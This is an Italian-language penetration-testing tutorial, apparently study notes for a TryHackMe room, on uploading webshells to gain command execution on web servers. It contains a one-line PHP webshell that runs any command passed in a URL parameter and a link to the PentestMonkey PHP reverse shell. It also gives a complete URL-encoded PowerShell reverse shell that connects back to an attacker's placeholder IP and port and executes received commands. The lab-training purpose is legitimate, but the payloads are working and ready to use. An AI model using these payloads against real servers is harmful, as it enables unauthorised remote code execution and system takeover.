# Caricare shell direttamente dall’url del sito

Ci sono volte in cui ci imbattiamo in siti **web** che ci offrono **l'opportunità** di **caricare**, in un modo o nell'altro, un **file eseguibile**. Idealmente, **sfrutteremmo** questa opportunità per **caricare** **codice** che attivi una reverse o bind **shell**, **ma a volte ciò non è possibile**. In questi casi, **caricheremmo invece** una ***webshell*** . Consulta la [Upload Vulnerabilities Room](https://tryhackme.com/room/uploadvulns) per un'analisi più approfondita di questo concetto.

"Webshell" è un termine colloquiale per uno **script** che viene **eseguito** **all'interno** di un **webserver** (solitamente in un linguaggio come PHP o ASP) che **esegue codice sul** **server**. In sostanza, i comandi vengono **inseriti** in una pagina web, tramite un **modulo HTML** **o** direttamente come argomenti **nell'URL**, che vengono poi eseguiti dallo script, con i risultati restituiti e scritti nella pagina. Questo può essere estremamente utile se sono presenti firewall, o anche solo come trampolino di lancio verso una reverse shell o una bind shell completamente sviluppate.

Poiché PHP è ancora il linguaggio di scripting lato server più diffuso, diamo un'occhiata ad un codice semplice per questo scopo.

In un formato molto semplice, su una sola riga:

**`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`**

Questo prenderà un parametro **GET** nell'URL e lo eseguirà sul sistema con **`shell_exec()`**. In sostanza, ciò significa che tutti i comandi che inseriamo nell'URL dopo **`?cmd=`**saranno eseguiti sul sistema, che sia Windows o Linux. Gli elementi "pre" servono per garantire che i risultati siano formattati correttamente sulla pagina.

Vediamolo in azione:

![image](https://github.com/user-attachments/assets/41684d84-a83f-42ef-91dc-78daff8c2aa7)

Nota che quando navigavamo nella shell, abbiamo usato un parametro GET "cmd" con il comando "ifconfig", che ha restituito correttamente le informazioni di rete del box. In altre parole, inserendo il **`ifconfig`**comando (usato per controllare le interfacce di rete su un target Linux ) nell'URL della nostra shell, è stato eseguito sul sistema, con i risultati restituiti a noi. Questo funzionerebbe per qualsiasi altro comando che scegliessimo di usare (ad esempio **`whoami`**, **`hostname`**, **`arch`**, ecc.).

Come accennato in precedenza, ci sono una varietà di webshell disponibili su Kali di default su **`/usr/share/webshells`**-- inclusa la famigerata [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) -- una reverse shell completa scritta in PHP. Nota che la maggior parte delle reverse shell generiche e specifiche del linguaggio (ad esempio PHP) sono scritte per target basati su Unix come i webserver Linux . Non funzioneranno su Windows di default.

Quando il target è Windows, spesso è più facile ottenere RCE usando una web shell, o usando msfvenom per generare una reverse/bind shell nel linguaggio del server. Con il primo metodo, l'ottenimento di RCE viene spesso eseguito con una URL Encoded Powershell Reverse Shell. Questo verrebbe copiato nell'URL come **`cmd`**argomento:

```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

Shell è codificata in URL per essere utilizzata in modo sicuro in un parametro GET. Ricorda che IP e Port (in grassetto, verso la fine della riga superiore) dovranno comunque essere modificati nel codice sopra.
